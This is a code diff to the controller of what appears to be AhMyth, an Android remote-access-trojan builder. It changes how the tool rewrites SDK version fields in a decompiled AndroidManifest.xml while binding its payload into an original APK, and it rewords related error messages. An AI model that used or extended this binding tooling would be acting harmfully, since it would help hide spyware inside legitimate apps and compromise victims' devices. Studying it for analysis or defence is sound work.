@@ -5715,9 +5715,11 @@ app.controller("AppCtrl", ($scope) => {
 
                           $appCtrl.Log("Modifying the Target SDK Version...");
                           $appCtrl.Log();
-                          var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
-                          var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
-                          var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
+                          var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
+                          var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
+                          var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+                          var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
+                          var repXmlSdk = data.replace(compSdkVerRegex, "$122"+'"').replace(compSdkVerNameRegex, "$111"+'"').replace(platVerCoRegex, "$122"+'"').replace(platVerNameRegex, "$111"+'"');
                           fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                             if (error) {
                                 $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
@@ -5819,9 +5821,11 @@ app.controller("AppCtrl", ($scope) => {
 
                               $appCtrl.Log("Modifying the Target SDK Version...");
                               $appCtrl.Log();
-                              var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
-                              var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
-                              var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
+                              var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
+                              var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
+                              var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+                              var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
+                              var repXmlSdk = data.replace(compSdkVerRegex, "$122"+'"').replace(compSdkVerNameRegex, "$111"+'"').replace(platVerCoRegex, "$122"+'"').replace(platVerNameRegex, "$111"+'"');
                               fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                 if (error) {
                                     $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
@@ -5933,11 +5937,11 @@ app.controller("AppCtrl", ($scope) => {
                     // generate a solid ahmyth apk
                     var filePath = $appCtrl.filePath;
                     if (filePath == null) {
-                        $appCtrl.Log("Browse an apk file which you want to bind", CONSTANTS.logStatus.FAIL);
+                        $appCtrl.Log("Browse for the Original APK you Want to Bind With", CONSTANTS.logStatus.FAIL);
                         $appCtrl.Log();
                         return;
                     } else if (!filePath.includes(".apk")) {
-                        $appCtrl.Log("It is not an apk file", CONSTANTS.logStatus.FAIL);
+                        $appCtrl.Log("Sorry! This is not an APK file", CONSTANTS.logStatus.FAIL);
                         $appCtrl.Log();
                         return;
                     }
